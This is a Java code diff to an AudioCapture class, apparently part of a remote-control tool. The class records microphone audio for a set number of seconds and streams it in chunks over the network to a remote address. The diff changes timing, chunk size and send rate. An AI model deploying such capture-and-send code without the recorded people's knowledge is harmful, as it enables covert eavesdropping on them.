@@ -8,7 +8,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.time.LocalTime;
 
-import static Tools.Globals.RECORD_TIME;
+import static Tools.Globals.BUFFER_SIZE;
 import static Tools.Globals.Sleep;
 
 public class AudioCapture extends Feature {
@@ -16,6 +16,8 @@ public class AudioCapture extends Feature {
     private TargetDataLine line;
     private static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
     private static final Line.Info info = new DataLine.Info(TargetDataLine.class, format);
+
+    private int time;
 
     public AudioCapture(PacketHandler packetHandler) {
         super(packetHandler);
@@ -44,6 +46,10 @@ public class AudioCapture extends Feature {
         }
     }
 
+    public void setTime(byte b){
+        this.time = b & 0xFF;
+    }
+
     @Override
     protected Runnable run() {
         return () -> {
@@ -53,19 +59,19 @@ public class AudioCapture extends Feature {
                 line.open(format);
                 line.start();
                 if (line.getFormat().matches(format)) {
-                    LocalTime targetTime = LocalTime.now().plusSeconds(RECORD_TIME / 1000);
+                    LocalTime targetTime = LocalTime.now().plusSeconds(time);
                     do {
                         int bytesRead = line.read(data, 0, data.length);
                         bos.write(data, 0, bytesRead);
-                    } while (LocalTime.now().getSecond() != targetTime.getSecond());
+                    } while (LocalTime.now().compareTo(targetTime) != 1);
                     line.close();
                     bos.close();
-                    byte[][] spliced = objectHandler.spliceArray(bos.toByteArray());
+                    byte[][] spliced = objectHandler.spliceArray(bos.toByteArray(), BUFFER_SIZE / 2);
                     for (int i = 0; i < spliced.length; i++) {
                         byte[] bytes = spliced[i];
-                        byte[] dataMsg = objectHandler.writeModifiedArray(objectHandler.writeObjects(() -> bytes), NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE, (byte) (i+1));
+                        byte[] dataMsg = objectHandler.writeModifiedArray(objectHandler.writeObjects(() -> bytes), NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE, Integer.valueOf(i).byteValue());
                         packetHandler.send(dataMsg, dataMsg.length, packetHandler.getAddress(), packetHandler.getPort());
-                        Sleep(1000/60);
+                        Sleep(1000 / 30);
                     }
                     packetHandler.send(new byte[]{NetworkInterface.CommandByte.AUDIOCAPTURE_INFO_STOP}, 1, packetHandler.getAddress(), packetHandler.getPort());
                 }
